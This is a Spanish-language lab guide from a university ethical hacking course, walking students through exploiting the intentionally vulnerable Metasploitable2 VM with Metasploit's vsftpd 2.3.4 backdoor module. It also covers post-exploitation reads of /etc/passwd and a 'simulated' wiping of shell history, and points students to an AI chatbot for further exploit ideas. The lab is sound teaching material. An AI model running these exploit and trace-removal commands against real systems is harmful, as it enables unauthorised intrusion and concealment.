# Laboratorio Semama 9 - Explotación de Vulnerabilidades con Metasploit y KaliGPT (CY-203 Hackeo Ético)

**Duración estimada:** 2.5 horas  
**Modalidad:** Práctica guiada en Kali Linux  
**Objetivo:** Aplicar técnicas de explotación de vulnerabilidades utilizando **Metasploit Framework**, analizar cargas (payloads), automatizar ataques y utilizar inteligencia artificial (**KaliGPT**) como apoyo para decisiones estratégicas.

---

## Introducción

Durante este laboratorio nos enfocaremos en la **fase de ataque** en el ciclo de hacking ético. Aprovecharemos vulnerabilidades detectadas previamente para **obtener acceso, control o extraer información** del sistema objetivo.

Utilizaremos **Metasploit**, un framework de explotación profesional y gratuito ampliamente utilizado por auditores de seguridad, y complementaremos la estrategia con **KaliGPT** para guiar y afinar el ataque. El entorno objetivo será la máquina **Metasploitable2**, desplegada como máquina virtual (VM) en VirtualBox o VMware.

### Conceptos básicos de Metasploit

- **RHOSTS**: Dirección IP del objetivo (por ejemplo, `192.168.50.110`)
- **RPORT**: Puerto en el que corre el servicio vulnerable (por ejemplo, `21` para FTP)
- **LHOST**: Dirección IP del atacante (la IP de Kali Linux)
- **LPORT**: Puerto local que usará el atacante para recibir la conexión reversa (por ejemplo, `4444`)
- **PAYLOAD**: Código que se ejecutará en la máquina víctima una vez explotada (por ejemplo, una shell reversa)
- **Exploit**: Código que aprovecha una vulnerabilidad
- **Session**: Conexión activa con la máquina víctima obtenida luego del exploit

---

## Parte 0: Preparación del Entorno con Metasploitable2 en VM

### 0.1 Requisitos previos

- VirtualBox o VMware instalado
- Kali Linux operativo (como host o VM)
- Archivo `.vmdk` o `.ova` de Metasploitable2

### 0.2 Descargar Metasploitable2

Descarga desde:
- https://sourceforge.net/projects/metasploitable/files/Metasploitable2/

Descomprime el archivo `.zip` para obtener el `.vmdk`.

### 0.3 Crear VM en VirtualBox

1. Abrir VirtualBox y crear nueva VM:
   - Tipo: **Linux**
   - Versión: **Ubuntu (32-bit)**
2. Asignar 1 GB de RAM mínimo
3. Seleccionar disco existente → cargar el `.vmdk`
4. Configurar red en **Adaptador Puente** o **Red Interna**

### 0.4 Iniciar y obtener IP de la VM

Usuario: `msfadmin`  
Contraseña: `msfadmin`

Ejecutar:
```bash
ifconfig
```
Anota la IP, por ejemplo: `192.168.50.110`

---

## Parte 1: Verificación de Metasploit Framework

En Kali Linux ya viene preinstalado:

```bash
msfconsole
```

Si no carga, ejecutar:

```bash
sudo systemctl start postgresql
msfdb init
```

---

## Parte 2: Reconocimiento con Nmap

Desde Kali escanea:

```bash
nmap -sV -p- 192.168.50.110
```

Ejemplo de servicios detectados:
- FTP (21)
- SSH (22)
- Telnet (23)
- HTTP (80)
- MySQL (3306)
- Apache Tomcat, Samba, etc.

---

## Parte 3: Ejecución de Exploits con Metasploit

### 3.1 Exploit: FTP vsftpd 2.3.4 backdoor

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP del VM Objetivo>
set RPORT 21
run
```

Si es exitoso, se abrirá una shell remota.

Verifica shell:
```bash
whoami
id
uname -a
```

---

## Parte 4: Post-Explotación

Una vez obtenida la shell, ejecuta:

```bash
id
hostname
cat /etc/passwd
```

---

## Parte 5: Eliminación de Rastros (simulado)

```bash
history -c
rm ~/.bash_history
```

> Esto es con fines educativos y no debe realizarse sin permisos.

---

## Refuerzo con KaliGPT

Usa: [https://chatgpt.com/g/g-uRhIB5ire-kali-gpt](https://chatgpt.com/g/g-uRhIB5ire-kali-gpt)

Ejemplos:
```text
¿Qué otros exploits puedo usar en Metasploitable2?
¿Cómo automatizo la explotación de Apache?
```

---

## Entregables

- Captura de `msfconsole` con exploit exitoso diferente al efectuado en este laboratorio
- Captura de `whoami` o `id`
- Evidencia del uso de KaliGPT
- Reflexión: ¿Qué aprendiste del uso de Metasploitable2?

---

## Recursos

- [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)
- [https://docs.rapid7.com/metasploit/](https://docs.rapid7.com/metasploit/)
- [https://chatgpt.com/g/g-uRhIB5ire-kali-gpt](https://chatgpt.com/g/g-uRhIB5ire-kali-gpt)

---

**Profesor:** Esteban Mata Morales  
**Curso:** CY-203 Hackeo Ético  
**Universidad Fidélitas de Costa Rica**
